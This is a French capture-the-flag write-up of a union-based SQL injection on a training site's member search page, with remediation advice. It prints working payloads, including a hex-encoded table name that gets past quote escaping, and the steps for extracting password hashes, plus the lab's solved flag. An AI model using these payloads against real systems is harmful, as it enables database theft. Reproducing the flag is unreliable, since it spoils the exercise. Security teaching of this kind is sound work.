# Injection SQL - Union Based (Page Member)

## Description de la faille

La page `?page=member` permet de rechercher des utilisateurs par leur identifiant (`id`). Cette page est vulnérable à une **Injection SQL** de type **Union-Based**. Le paramètre `id` transmis via l'URL n'est pas correctement filtré ou préparé avant d'être inséré dans la requête SQL exécutée par le serveur.

Cela permet à un attaquant de modifier la structure de la requête originale pour extraire des informations provenant de l'ensemble de la base de données (noms de tables, colonnes, données sensibles).

## Preuve de Concept (PoC)

### 1. Vérification de la vulnérabilité

En injectant une condition toujours vraie, nous parvenons à lister tous les membres de la base de données :

* **Payload :** `1 OR 1=1`
* **Résultat :** Le serveur affiche les informations de tous les utilisateurs enregistrés au lieu d'un seul.

### 2. Énumération des colonnes

Pour utiliser l'opérateur `UNION`, il faut déterminer le nombre de colonnes retournées par la requête initiale.

* **Payload :** `1 UNION SELECT 1,2`
* **Résultat :** Les chiffres `1` et `2` s'affichent dans les champs "First name" et "Surname", confirmant que la requête utilise **2 colonnes**.

### 3. Extraction du schéma (Contournement des quotes)

Le serveur échappe les guillemets simples (Magic Quotes), empêchant l'utilisation de `WHERE table_name = 'users'`. Ce filtre est contourné en utilisant la valeur hexadécimale du nom de la table :

* **Table `users` en hexadécimal :** `0x7573657273`
* **Payload pour lister les colonnes :** `1 UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 0x7573657273`

### 4. Extraction des données sensibles

L'analyse des colonnes a révélé deux champs intéressants : `Commentaire` et `countersign`.

* **Payload final :** `1 UNION SELECT Commentaire, countersign FROM users`

L'utilisateur nommé **Flag** retourne les informations suivantes :

* **Commentaire :** `Decrypt this password -> then lower all the char. Sh256 on it and it's good !`
* **Countersign (MD5) :** `5ff9d0165b4f92b14994e5c685cdce28`

## Résolution du Flag

1. **Déchiffrement MD5 :** Le hash `5ff9d0165b4f92b14994e5c685cdce28` correspond au texte `FortyTwo`.
2. **Traitement :** Passage en minuscules -> `fortytwo`.
3. **Hashage final :**
```bash
echo -n "fortytwo" | sha256sum

```

**Flag :** `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

## Pourquoi cela fonctionne ?

L'application utilise la concaténation de chaînes de caractères pour construire ses requêtes SQL. L'entrée utilisateur est directement intégrée dans la clause `WHERE`. Bien qu'une tentative de protection contre les guillemets soit présente, elle ne bloque pas les mots-clés SQL (`UNION`, `SELECT`) ni les représentations hexadécimales des chaînes de caractères.

## Remédiation

* **Requêtes Préparées (Prepared Statements) :** Utiliser systématiquement des requêtes paramétrées (ex: PDO en PHP) pour séparer le code SQL des données utilisateurs.
* **Validation des entrées :** Vérifier que le paramètre `id` est bien un entier avant de l'envoyer à la base de données.
* **Principe du moindre privilège :** Restreindre les droits de l'utilisateur SQL pour qu'il ne puisse pas accéder à `information_schema`.
